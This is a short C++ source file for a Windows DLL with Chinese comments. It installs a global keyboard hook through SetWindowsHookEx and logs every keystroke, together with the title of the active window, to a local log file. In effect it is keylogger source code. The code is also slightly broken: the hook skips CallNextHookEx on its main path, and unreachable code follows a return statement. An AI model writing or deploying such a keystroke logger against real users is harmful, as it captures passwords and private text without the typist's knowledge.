// KeyHookDLL.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include "KeyHookDLL.h"
#include <Windows.h>
#include "Logger.h"

using namespace LOGGER;
CLogger logger(LogLevel_Info, CLogger::GetAppPathA().append("log\\"));

HHOOK g_hHook;

LRESULT CALLBACK hookProc(int code, WPARAM wParam, LPARAM lParam)
{
	char szWindowTitle[MAX_PATH];
	char szKeyName[256];

	HWND hWnd = GetActiveWindow();//当前窗口
	if (hWnd == NULL)
	{
		hWnd = GetForegroundWindow();//最前端窗口
		if (hWnd == NULL)
		{
			return CallNextHookEx(g_hHook, code, wParam, lParam);
		}
	}

	if (code < 0 || code == HC_NOREMOVE)
	{
		return CallNextHookEx(g_hHook, code, wParam, lParam);
	}
	if (lParam & 0x40000000)
	{
		return CallNextHookEx(g_hHook, code, wParam, lParam);
	}

	GetWindowTextA(hWnd, szWindowTitle, 255);//获取窗口标题

	GetKeyNameTextA(lParam, szKeyName, 255);//获取键盘文本

	logger.TraceInfo("%s - %s", szWindowTitle, szKeyName);

	return LRESULT();
}

bool installHook()
{
	g_hHook = SetWindowsHookEx(WH_KEYBOARD, hookProc, GetModuleHandle("KeyHookDLL"), NULL);//安装钩子
	
	if (g_hHook != NULL)
	{
		return true;
	}
	return false;
}

bool unInstallHook()
{
	if (g_hHook)
	{
		return UnhookWindowsHookEx(g_hHook); //卸载钩子

		g_hHook = NULL;
	}
	return false;
}
